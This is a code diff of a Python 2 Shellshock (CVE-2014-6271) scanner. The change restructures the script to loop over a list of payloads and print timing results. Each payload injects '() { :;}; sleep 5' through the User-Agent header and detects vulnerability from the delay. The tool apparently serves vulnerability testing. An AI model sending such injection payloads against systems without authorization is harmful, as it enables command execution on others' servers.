@@ -11,6 +11,9 @@ class color:
 
 # Variable for sleep time that will be injected, change as needed.
 sleep_time = 5
+sleep_time = str(sleep_time)
+is_vulnerable = False
+
 
 url = ""
 try:
@@ -21,19 +24,27 @@ except:
 
 	sys.exit()
 
-
 shock = requests.Session()
 
-payload = "() { :;}; sleep "+str(sleep_time)
-headers = {"User-Agent": payload}
 
-start = time()
-response = shock.get(url, headers=headers)
+payloads = [{"cve":"CVE-2014-6271", "payload":"() { :;}; sleep "+sleep_time}]
 
 
-delay = time() - start
+for bug in payloads:
+	payload = bug["payload"]
+	headers = {"User-Agent": payload}
 
-if delay > sleep_time:
-	print "{0}{1} appears to be vulnerable{2}".format(color.red, url, color.end)
-else:
-	print "{0}{1} is not vulnerable.{2}".format(color.green, url, color.end)
+	start = time()
+	response = shock.get(url, headers=headers)
+
+	delay = time() - start
+
+	print delay
+
+	if delay > int(sleep_time):
+		is_vulnerable = True
+		print "{0}{1} appears to be vulnerable to {2}{3}".format(color.red, url, bug["cve"], color.end)
+	else:
+		pass
+if is_vulnerable == False:
+	print "{0}{1} is not vulnerable to any of the recent BASH vulnerabilities.{2}".format(color.green, url, color.end)
